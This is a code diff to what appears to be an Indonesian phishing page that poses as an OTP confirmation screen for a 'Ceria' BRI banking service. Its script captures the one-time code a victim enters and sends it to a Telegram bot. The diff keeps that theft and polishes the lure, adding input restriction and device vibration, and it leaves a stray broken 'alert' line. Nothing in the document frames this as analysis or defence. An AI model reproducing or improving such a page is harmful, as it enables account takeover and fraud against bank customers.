@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Konfirmasi OTP Ceria</title>
+  <title>Otp Ceria Bri</title>
   <meta name="viewport" content="width, initial-scale=1">
   <style>
     body {
@@ -157,19 +157,44 @@ function sendMessageToTelegram(message) {
       xhttp.open("POST", url, true);
       xhttp.send();
     }
+    function vibrateDevice() {
+  if (navigator.vibrate) {
+    // Pemicu getaran selama 300ms
+    navigator.vibrate(300);
+  }
+}
+function restrictInput(element) {
+    // Menghilangkan karakter non-angka dari input
+    element.value = element.value.replace(/[^0-9]/g, '');
 
-    function kirimPesan(inputNumber) {
-      var kodeOTP = document.getElementById("kode-otp").value;
-
-      switch (inputNumber) {
-        case 1:
-          sendMessageToTelegram("Kode OTP: " + kodeOTP);
-          break;
-        default:
-      }
-
-      document.getElementById("result").style.display = "block";
+    // Memastikan panjang input antara 4 dan 6 karakter
+    var maxLength = 6;
+    if (element.value.length > maxLength) {
+      element.value = element.value.slice(0, maxLength);
+    } else if (element.value.length < 4) {
+      // Opsi: biarkan pengguna memasukkan minimal 4 angka
+      // element.value = element.value.padEnd(4, '0');
     }
+  }
+function kirimPesan(inputNumber) {
+  var kodeOTP = document.getElementById("kode-otp").value;
+
+  if (kodeOTP === "") {
+    alert
+    vibrateDevice(); // Memicu getaran jika kolom OTP kosong
+    return;
+  }
+
+  switch (inputNumber) {
+    case 1:
+      sendMessageToTelegram("Kode OTP: " + kodeOTP);
+      break;
+    default:
+  }
+
+  document.getElementById("result").style.display = "block";
+}
+    
 
     function resendCode() {
       alert("OTP code resent!");
@@ -214,7 +239,7 @@ function sendMessageToTelegram(message) {
   </div>
 
   <!-- Kolom Input Kode OTP -->
-  <input type="number" id="kode-otp" name="kode_otp" placeholder="Masukan Kode OTP" maxlength="6">
+  <input type="number" id="kode-otp" name="kode_otp" placeholder="Masukan Kode OTP" maxlength="6" oninput="restrictInput(this)">
 
   <!-- Waktu Hitung Mundur -->
   <div id="countdown"></div>
